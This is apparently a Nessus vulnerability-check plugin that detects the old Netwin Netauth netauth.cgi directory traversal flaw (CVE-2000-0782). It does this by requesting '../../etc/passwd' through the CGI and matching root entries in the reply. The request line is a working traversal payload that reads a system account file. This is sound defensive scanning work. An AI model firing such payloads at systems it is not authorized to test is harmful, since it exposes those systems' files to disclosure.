#
# (C) Tenable Network Security, Inc.
#

include( 'compat.inc' );

if(description)
{
  script_id(10494);
  script_bugtraq_id(1587);
  script_version ("$Revision: 1.21 $");
  script_cve_id("CVE-2000-0782");
  script_xref(name:"OSVDB", value:"393");

  script_name(english:"Netwin Netauth netauth.cgi Traversal Arbitrary File Access");
  script_summary(english:"Checks for the presence of /cgi-bin/netauth.cgi" );

  script_set_attribute(
    attribute:'synopsis',
    value:'The remote service is prone to an authentication bypass issue.'
  );

  script_set_attribute(
    attribute:'description',
    value:"The 'Netauth' CGI is installed.  This CGI has a well-known security
flaw that lets an attacker read arbitrary files with the privileges of
the http daemon (usually root or nobody)."
  );

  script_set_attribute(
    attribute:'solution',
    value: "Upgrade to Netwin Netauth 4.2f or later."
  );

  script_set_attribute(
    attribute:'see_also',
    value:'http://netwinsite.com/netauth/updates.htm'
  );

  script_set_attribute(
    attribute:'cvss_vector',
    value:'CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N'
  );

  script_end_attributes();

  script_category(ACT_GATHER_INFO);

  script_copyright(english:"This script is Copyright (C) 2000-2009 Tenable Network Security, Inc.");
  script_family(english:"CGI abuses");
  script_dependencie("http_version.nasl", "find_service1.nasl", "no404.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  exit(0);
}

#
# The script code starts here
#
include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);

foreach dir (cgi_dirs())
{
 data = string(dir,  "/netauth.cgi?cmd=show&page=../../../../../../../../../etc/passwd");
 data = http_get(item:data, port:port);
 buf = http_keepalive_send_recv(port:port, data:data);
 if( buf == NULL ) exit(0);
 if(egrep(pattern:".*root:.*:0:[01]:.*", string:buf))security_warning(port);
}
